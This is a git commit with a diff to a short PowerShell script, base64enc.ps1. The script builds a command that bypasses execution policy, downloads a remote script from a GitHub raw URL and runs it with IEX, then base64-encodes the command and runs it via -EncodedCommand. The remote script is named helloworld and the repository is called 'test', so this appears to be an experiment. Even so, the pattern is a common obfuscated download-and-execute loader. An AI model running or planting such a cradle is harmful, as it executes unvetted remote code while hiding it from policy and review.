ff90b775ea986ffa47705c1e86fc255443db3770
imjustgunnamakethisthing <49309038+imjustgunnamakethisthing@users.noreply.github.com>
2019-04-09 14:49:38 +0100

    Update base64enc.ps1

--- base64enc.ps1
+++ base64enc.ps1
@@ -1,3 +1,4 @@
-$cmd = "powershell -nop -exec bypass -c `"IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/imjustgunnamakethisthing/test/master/helloworld.ps1’);`""
+$cmd = "powershell -nop -exec bypass -c `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/imjustgunnamakethisthing/test/master/helloworld.ps1');`""
 $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+host-write $encodedCmd
 powershell -EncodedCommand  $encodedCmd
